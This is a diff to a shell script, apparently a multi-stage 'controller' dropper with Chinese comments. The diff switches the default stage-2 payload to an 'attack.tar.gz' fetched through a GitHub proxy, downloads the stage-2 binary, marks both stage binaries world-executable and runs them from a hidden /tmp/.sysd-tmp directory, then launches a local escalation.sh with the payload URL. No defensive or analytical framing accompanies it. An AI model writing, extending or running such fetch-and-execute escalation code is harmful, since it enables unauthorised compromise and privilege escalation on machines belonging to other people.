@@ -6,6 +6,10 @@ MAX_RETRIES=5
 RETRY_DELAY=8
 TMPDIR_BASE="/tmp/.sysd-tmp"
 
+# escalation.sh 路径（默认与本脚本同目录）
+SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+ESCALATION_SH="${SCRIPT_DIR}/escalation.sh"
+
 touch /tmp/controller_maked_test_01122110
 
 # ==================== Stage2 URL 映射表 ====================
@@ -16,7 +20,7 @@ declare -A STAGE2_URL_MAP=(
     ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
 )
 
-DEFAULT_STAGE2="https://github.com/Jerryy959/controller/releases/download/v1/escalation-default.elf"
+DEFAULT_STAGE2="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"
 
 # ==================== 日志函数 ====================
 log() {
@@ -100,12 +104,35 @@ while [ $attempt -le $MAX_RETRIES ]; do
         continue
     fi
 
+    if ! download_file "$STAGE2_URL" "$stage2_bin" "Stage2"; then
+        attempt=$((attempt + 1))
+        sleep $RETRY_DELAY
+        continue
+    fi
+
     log_info "启动 Stage1 (host=$HOST_NAME)"
     if STAGE2_URL="$STAGE2_URL" \
        STAGE2_FILENAME="$stage2_bin" \
        HOST_IDENTIFIER="$HOST_NAME" \
-        chmod 777 ./$stage1_bin && ./$stage1_bin | tee /tmp/stage1; then
+        chmod 777 "./$stage1_bin" "./$stage2_bin" && ./$stage1_bin | tee /tmp/stage1; then
         log_success "Stage1 执行成功 (退出码: $?)"
+
+        log_info "准备执行 escalation.sh，并传入参数: $STAGE2_URL"
+        if [ ! -f "$ESCALATION_SH" ]; then
+            log_error "找不到 escalation.sh: $ESCALATION_SH"
+            exit 1
+        fi
+        chmod +x "$ESCALATION_SH" 2>/dev/null || true
+        # 传入参数：stage2_url（即 STAGE2_URL）
+        if "$ESCALATION_SH" "$STAGE2_URL"; then
+            log_success "escalation.sh 执行成功"
+            log_success "控制器正常退出"
+            exit 0
+        else
+            exit_code=$?
+            log_error "escalation.sh 执行失败 (退出码: $exit_code)"
+            exit $exit_code
+        fi
         log_success "控制器正常退出"
         exit 0
     else
